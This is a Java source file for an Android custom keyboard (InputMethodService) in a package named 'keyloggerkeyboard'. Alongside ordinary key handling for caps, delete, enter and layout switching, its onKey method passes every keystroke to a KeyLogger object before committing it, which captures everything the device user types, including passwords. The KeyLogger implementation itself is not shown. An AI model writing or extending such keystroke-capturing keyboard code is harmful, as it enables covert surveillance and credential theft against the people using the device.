package com.example.keyloggerkeyboard;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

public class SimpleKeyboardService extends InputMethodService 
    implements KeyboardView.OnKeyboardActionListener {
    
    private KeyboardView keyboardView;
    private Keyboard qwertyKeyboard;
    private Keyboard numberPad;
    private boolean isNumberPad = false;
    private boolean isCaps = false;
    private KeyLogger keyLogger;
    
    @Override
    public void onCreate() {
        super.onCreate();
        keyLogger = new KeyLogger(getApplicationContext());
    }
    
    @Override
    public View onCreateInputView() {
        keyboardView = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view, null);
        
        // Initialize keyboards
        qwertyKeyboard = new Keyboard(this, R.xml.keyboard_layout);
        numberPad = new Keyboard(this, R.xml.number_pad);
        
        // Set QWERTY as default
        keyboardView.setKeyboard(qwertyKeyboard);
        keyboardView.setOnKeyboardActionListener(this);
        keyboardView.setPreviewEnabled(false); // Samsung style - no preview
        
        return keyboardView;
    }
    
    @Override
    public void onStartInputView(EditorInfo info) {
        super.onStartInputView(info);
        // Reset to QWERTY when starting new input
        if (isNumberPad) {
            switchKeyboard();
        }
    }
    
    // Switch between QWERTY and Number pad
    private void switchKeyboard() {
        isNumberPad = !isNumberPad;
        keyboardView.setKeyboard(isNumberPad ? numberPad : qwertyKeyboard);
    }
    
    // Toggle caps lock
    private void toggleCaps() {
        isCaps = !isCaps;
        for (Keyboard.Key key : qwertyKeyboard.getKeys()) {
            if (key.label != null && key.label.length() == 1 && Character.isLetter(key.label.charAt(0))) {
                key.label = isCaps ? key.label.toString().toUpperCase() : key.label.toString().toLowerCase();
                key.codes[0] = isCaps ? key.label.toString().toUpperCase().charAt(0) : key.label.toString().toLowerCase().charAt(0);
            }
        }
        keyboardView.invalidateAllKeys();
    }
    
    // Handle key press
    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        
        // Log the key
        keyLogger.logKey(primaryCode);
        
        // Handle special keys
        switch (primaryCode) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                break;
                
            case Keyboard.KEYCODE_SHIFT:
                toggleCaps();
                break;
                
            case Keyboard.KEYCODE_MODE_CHANGE:
                switchKeyboard();
                break;
                
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER));
                break;
                
            case Keyboard.KEYCODE_ALT: // For language switch (if implemented)
                // Language switch logic here
                break;
                
            default:
                // Handle normal character input
                char code = (char) primaryCode;
                if (Character.isLetter(code) && isCaps) {
                    code = Character.toUpperCase(code);
                }
                ic.commitText(String.valueOf(code), 1);
                break;
        }
    }
    
    // Other required methods (empty implementation)
    @Override public void onPress(int primaryCode) {}
    @Override public void onRelease(int primaryCode) {}
    @Override public void onText(CharSequence text) {}
    @Override public void swipeLeft() {}
    @Override public void swipeRight() {}
    @Override public void swipeDown() {}
    @Override public void swipeUp() {}
}